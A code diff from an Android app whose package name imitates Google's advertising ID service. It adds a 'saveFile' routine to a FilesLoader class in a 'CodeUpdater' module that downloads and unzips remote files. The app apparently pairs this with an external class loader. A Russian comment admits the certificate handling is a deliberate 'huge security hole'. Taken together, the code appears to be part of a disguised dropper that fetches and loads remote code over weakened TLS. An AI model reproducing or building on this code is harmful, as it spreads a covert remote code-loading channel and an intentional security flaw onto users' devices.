@@ -3,10 +3,12 @@ package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdat
 import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Environment;
+import android.util.Log;
 
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
+import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicer;
 
 import java.io.BufferedInputStream;
 import java.io.ByteArrayInputStream;
@@ -74,9 +76,9 @@ public class FilesLoader {
         String res = "";
         try {
             URL url = new URL(query);
-            String pass = new GlobalParameters().getPassToCert();
+            String pass = new com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters().getPassToCert();
             KeyStore clientStore = KeyStore.getInstance("PKCS12");
-            String cert = new GlobalParameters().getCert();
+            String cert = new com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters().getCert();
             InputStream is = new ByteArrayInputStream(toByte(cert));
 
             clientStore.load(is, pass.toCharArray());
@@ -87,6 +89,7 @@ public class FilesLoader {
 
 
             // TODO: Сделать по людски! Это решение - огромная дыра в безопасности:
+            //       Этот метод надо бы перенести в NDK
             // см. https://developer.android.com/training/articles/security-ssl.html#CommonHostnameProbs
             //     https://stackoverflow.com/questions/6659360/how-to-solve-javax-net-ssl-sslhandshakeexception-error?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
             //---------------------------------------------------------------------->
@@ -248,6 +251,21 @@ public class FilesLoader {
         downloadBinaryFile(url, file);
     }
 
+    public static void saveFile(final Context cnt, final String url, Boolean isNeedUnzip, String comment, String downloadID, final String path_to_zip, final String path_to_unzip, String unzip_name) {
+        Boolean isFileDownloaded = true;
+        Logger.log("Грузим файл из:" + url);
+        String full_url = RestServicer.getUrlToDownloadFile(cnt, url, comment, downloadID);
+Log.e("!!!-->", "full_url = " + full_url);
+//   TODO:   RERPLACE!!!! ---> ЗАМЕНИТЬ!!! downloadFile(cnt, full_url, path_to_zip);
+        downloadFile(cnt, url, path_to_zip); //<<<------------ на full_url
+        if (isNeedUnzip) {
+            isFileDownloaded = unpackZip(path_to_unzip, unzip_name);
+        }
+        if (isFileDownloaded)
+        {
+            //Отправляем лог на сервер что файл скачался
+        }
+    }
 
     public static boolean unpackZip(String path, String zipname)
     {
